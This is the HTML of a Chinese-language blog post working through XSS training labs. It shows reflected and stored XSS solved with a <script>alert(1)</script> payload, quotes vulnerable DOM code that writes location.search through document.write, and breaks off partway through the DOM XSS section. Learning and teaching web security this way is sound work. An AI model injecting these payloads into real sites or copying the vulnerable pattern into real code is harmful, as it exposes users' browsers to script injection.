<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="反射型XSS实验要求：该实验室包含搜索功能中的一个简单的反映型跨站点脚本漏洞。 为了解决实验问题，执行调用该函数的跨站点脚本攻击alert。 实验过程：当我们在搜索框输入123：   服务器会回显我们输入的内容。 如果我们输入：&lt;script&gt;alert(1)&lt;&#x2F;script&gt;   做到这里，实验就完成了。  如果我们诱导其他人访问这个链接，我们的恶意代码就会在别人的浏览器">
<meta property="og:type" content="article">
<meta property="og:title" content="XSS">
<meta property="og:url" content="https://21346asz.github.io/XSS/XSS/index.html">
<meta property="og:site_name" content="wArn&#39;s blog">
<meta property="og:description" content="反射型XSS实验要求：该实验室包含搜索功能中的一个简单的反映型跨站点脚本漏洞。 为了解决实验问题，执行调用该函数的跨站点脚本攻击alert。 实验过程：当我们在搜索框输入123：   服务器会回显我们输入的内容。 如果我们输入：&lt;script&gt;alert(1)&lt;&#x2F;script&gt;   做到这里，实验就完成了。  如果我们诱导其他人访问这个链接，我们的恶意代码就会在别人的浏览器">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250725110101686.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250725110228311.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250726225005681.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250727091021107.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250727091921196.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250727094459612.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250727094649167.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250727102626335.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250727105438480.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250727105608795.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250727110104657.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250727114012736.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250727114159206.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250727114615500.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250727114711283.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250728090148823.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250728090350901.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250728091507536.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250728091718036.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250728092825188.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250728093827800.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250728093937822.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250728114042113.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250728114151058.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250728114641923.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729092941883.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729093020885.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729094620108.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729095151425.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729095350905.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729095414229.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729135925123.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729141738758.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729141829147.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729143741564.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729143716823.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729143915705.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729144419379.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250730100152059.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250730095938675.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250730100257643.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250730100526491.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250730100628951.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250730100912245.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250730101221902.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250730115204233.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250730115837685.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250731090453332.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250731092804292.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250731102123243.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250731103646914.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250731104732602.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250724073356812.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250724073528487.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250724073818519.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250724085458920.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250724111520821.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250724112537643.png">
<meta property="article:published_time" content="2025-07-23T23:32:01.000Z">
<meta property="article:modified_time" content="2025-07-31T03:40:18.689Z">
<meta property="article:author" content="wArn">
<meta property="article:tag" content="XSS">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://21346asz.github.io/XSS/XSS/image-20250725110101686.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>XSS</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/categories/">categories</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/CTFwp/XYCTF-2025/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/CTFwp/BJDCTF-2020/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://21346asz.github.io/XSS/XSS/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://21346asz.github.io/XSS/XSS/&text=XSS"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://21346asz.github.io/XSS/XSS/&title=XSS"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://21346asz.github.io/XSS/XSS/&is_video=false&description=XSS"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=XSS&body=Check out this article: https://21346asz.github.io/XSS/XSS/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://21346asz.github.io/XSS/XSS/&title=XSS"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://21346asz.github.io/XSS/XSS/&title=XSS"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://21346asz.github.io/XSS/XSS/&title=XSS"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://21346asz.github.io/XSS/XSS/&title=XSS"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://21346asz.github.io/XSS/XSS/&name=XSS&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://21346asz.github.io/XSS/XSS/&t=XSS"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">1.</span> <span class="toc-text">反射型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">2.</span> <span class="toc-text">存储型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-1"><span class="toc-number">2.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-1"><span class="toc-number">2.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM-XSS"><span class="toc-number">3.</span> <span class="toc-text">DOM XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Edocument-write%E6%8E%A5%E6%94%B6%E5%99%A8%E7%9A%84DOM-XSS%E6%94%BB%E5%87%BB%EF%BC%8C%E4%BD%BF%E7%94%A8location-search%E4%BD%9C%E4%B8%BA%E6%94%BB%E5%87%BB%E6%BA%90"><span class="toc-number">3.1.</span> <span class="toc-text">基于document.write接收器的DOM XSS攻击，使用location.search作为攻击源</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-2"><span class="toc-number">3.1.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-2"><span class="toc-number">3.1.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Edocument-write%E6%8E%A5%E6%94%B6%E5%99%A8%E7%9A%84DOM-XSS-%E6%94%BB%E5%87%BB%EF%BC%8C%E5%9C%A8select%E5%85%83%E7%B4%A0%E5%86%85%E5%88%A9%E7%94%A8location-search%E4%BD%9C%E4%B8%BA%E6%94%BB%E5%87%BB%E6%BA%90"><span class="toc-number">3.2.</span> <span class="toc-text">基于document.write接收器的DOM XSS 攻击，在select元素内利用location.search作为攻击源</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-3"><span class="toc-number">3.2.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-3"><span class="toc-number">3.2.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Elocation-search%E6%BA%90%E9%80%9A%E8%BF%87innerHTML%E6%8E%A5%E6%94%B6%E5%99%A8%E8%A7%A6%E5%8F%91%E7%9A%84DOM%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.</span> <span class="toc-text">基于location.search源通过innerHTML接收器触发的DOM型XSS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82"><span class="toc-number">3.3.1.</span> <span class="toc-text">实验要求:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-4"><span class="toc-number">3.3.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8location-search%E6%94%BB%E5%87%BBjQuery%E7%9A%84a%E6%A0%87%E7%AD%BEhref%E5%B1%9E%E6%80%A7%E5%AF%BC%E8%87%B4%E7%9A%84DOM%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.4.</span> <span class="toc-text">利用location.search攻击jQuery的a标签href属性导致的DOM型XSS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-4"><span class="toc-number">3.4.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-5"><span class="toc-number">3.4.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-hashchange-%E4%BA%8B%E4%BB%B6%E5%9C%A8-jQuery-%E9%80%89%E6%8B%A9%E5%99%A8%E6%8E%A5%E6%94%B6%E5%99%A8%E4%B8%AD%E8%A7%A6%E5%8F%91%E7%9A%84-DOM-XSS-%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.5.</span> <span class="toc-text">利用 hashchange 事件在 jQuery 选择器接收器中触发的 DOM XSS 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-5"><span class="toc-number">3.5.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-6"><span class="toc-number">3.5.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AngularJS%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%AD%E5%AD%98%E5%9C%A8DOM%E5%9E%8B%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%EF%BC%88XSS%EF%BC%89%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%B8%94%E5%B0%96%E6%8B%AC%E5%8F%B7%E5%92%8C%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%A2%ABHTML%E7%BC%96%E7%A0%81"><span class="toc-number">3.6.</span> <span class="toc-text">AngularJS表达式中存在DOM型跨站脚本（XSS）漏洞，且尖括号和双引号被HTML编码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-6"><span class="toc-number">3.6.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B"><span class="toc-number">3.6.2.</span> <span class="toc-text">实验过程:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B-DOM-XSS%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.7.</span> <span class="toc-text">反射型 DOM XSS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-7"><span class="toc-number">3.7.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-7"><span class="toc-number">3.7.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B-DOM-XSS%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.8.</span> <span class="toc-text">存储型 DOM XSS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-8"><span class="toc-number">3.8.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-8"><span class="toc-number">3.8.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-number">4.</span> <span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%A4%9A%E6%95%B0%E6%A0%87%E7%AD%BE%E5%92%8C%E5%B1%9E%E6%80%A7%E8%A2%AB%E7%A6%81%E6%AD%A2%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%94%BB%E5%87%BB"><span class="toc-number">4.1.</span> <span class="toc-text">大多数标签和属性被禁止的反射型XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-1"><span class="toc-number">4.1.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-1"><span class="toc-number">4.1.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%81%E6%AD%A2%E4%BA%86%E6%89%80%E6%9C%89%E9%99%A4%E8%87%AA%E5%88%B6%E6%A0%87%E7%AD%BE%E4%BB%A5%E5%A4%96%E7%9A%84%E6%89%80%E6%9C%89%E6%A0%87%E7%AD%BE%E7%9A%84XSS%E6%94%BB%E5%87%BB"><span class="toc-number">4.2.</span> <span class="toc-text">禁止了所有除自制标签以外的所有标签的XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-2"><span class="toc-number">4.2.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-2"><span class="toc-number">4.2.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%80%E6%9C%89%E4%BA%8B%E4%BB%B6%E5%92%8C-href-%E5%B1%9E%E6%80%A7%E5%9D%87%E8%A2%AB%E9%98%BB%E6%AD%A2%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS"><span class="toc-number">4.3.</span> <span class="toc-text">所有事件和 href 属性均被阻止的反射型 XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-3"><span class="toc-number">4.3.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-3"><span class="toc-number">4.3.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%81%E8%AE%B8%E9%83%A8%E5%88%86SVG%E6%A0%87%E8%AE%B0%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">4.4.</span> <span class="toc-text">允许部分SVG标记的反射型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-4"><span class="toc-number">4.4.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-4"><span class="toc-number">4.4.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AFCTF-2021-BABY-CSP"><span class="toc-number">5.</span> <span class="toc-text">[AFCTF 2021]BABY_CSP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-18-Basic-%E9%97%A8%E9%85%B1%E6%83%B3%E7%8E%A9%E4%BB%80%E4%B9%88%E5%91%A2%EF%BC%9F"><span class="toc-number">6.</span> <span class="toc-text">[NSSRound#18 Basic]门酱想玩什么呢？</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        XSS
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">wArn</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-07-23T23:32:01.000Z" class="dt-published" itemprop="datePublished">2025-07-24</time>
        
        (Updated: <time datetime="2025-07-31T03:40:18.689Z" class="dt-updated" itemprop="dateModified">2025-07-31</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/XSS/">XSS</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/XSS/" rel="tag">XSS</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><h3 id="实验要求："><a href="#实验要求：" class="headerlink" title="实验要求："></a>实验要求：</h3><p>该实验室包含搜索功能中的一个简单的反映型跨站点脚本漏洞。</p>
<p>为了解决实验问题，执行调用该函数的跨站点脚本攻击<code>alert</code>。</p>
<h3 id="实验过程："><a href="#实验过程：" class="headerlink" title="实验过程："></a>实验过程：</h3><p>当我们在搜索框输入123：</p>
<img src="/XSS/XSS/image-20250725110101686.png" class="" title="image-20250725110101686">

<p>服务器会回显我们输入的内容。</p>
<p>如果我们输入：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<img src="/XSS/XSS/image-20250725110228311.png" class="" title="image-20250725110228311">

<p>做到这里，实验就完成了。</p>
<blockquote>
<p>如果我们诱导其他人访问这个链接，我们的恶意代码就会在别人的浏览器上执行，这就造成了XSS攻击。</p>
</blockquote>
<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><h3 id="实验要求：-1"><a href="#实验要求：-1" class="headerlink" title="实验要求："></a>实验要求：</h3><p>该实验室包含评论功能中的存储跨站点脚本漏洞。</p>
<p>为了解决这个实验，请提交一条评论，在查看博客文章的评论时调用<code>alert</code>函数。</p>
<h3 id="实验过程：-1"><a href="#实验过程：-1" class="headerlink" title="实验过程："></a>实验过程：</h3><p>点击一篇博客的view post。</p>
<img src="/XSS/XSS/image-20250726225005681.png" class="" title="image-20250726225005681">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Comment: &lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>其他内容随便输入，但是要注意格式。</p>
<p>现在提交评论，并返回查看评论，触发alert函数，实验到此结束。</p>
<blockquote>
<p>存储型XSS相比较反射型XSS攻击更加危险，反射型XSS还需要我们去诱导受害者访问，存储型XSS是直接保存到服务器上的，当别人查看时，会自动触发。</p>
</blockquote>
<h2 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h2><h3 id="基于document-write接收器的DOM-XSS攻击，使用location-search作为攻击源"><a href="#基于document-write接收器的DOM-XSS攻击，使用location-search作为攻击源" class="headerlink" title="基于document.write接收器的DOM XSS攻击，使用location.search作为攻击源"></a>基于<code>document.write</code>接收器的DOM XSS攻击，使用<code>location.search</code>作为攻击源</h3><h4 id="实验要求：-2"><a href="#实验要求：-2" class="headerlink" title="实验要求："></a>实验要求：</h4><p>此实验室包含一个基于 DOM 的跨站点脚本漏洞，该漏洞存在于搜索查询跟踪功能中。该漏洞利用 JavaScript的<code>document.write</code>函数将数据写入页面。该<code>document.write</code>函数调用来自<code>location.search</code>的数据，我们可以通过网站URL控制该数据源。</p>
<p>为了解决这个实验，请发起一个执行alert函数的跨站点脚本攻击。</p>
<h4 id="实验过程：-2"><a href="#实验过程：-2" class="headerlink" title="实验过程："></a>实验过程：</h4><p>在搜索页面，输入test123：</p>
<img src="/XSS/XSS/image-20250727091021107.png" class="" title="image-20250727091021107">

<p>f12，打开开发者工具，发现如下javascript代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">trackSearch</span>(<span class="params">query</span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#x27;</span>+query+<span class="string">&#x27;&quot;&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> query = (<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)).<span class="title function_">get</span>(<span class="string">&#x27;search&#x27;</span>); <span class="comment">// 获取search参数</span></span><br><span class="line"><span class="keyword">if</span>(query) &#123;</span><br><span class="line">    <span class="title function_">trackSearch</span>(query); <span class="comment">// 调用trackSearch插入数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过”&gt;&lt;”闭合：</p>
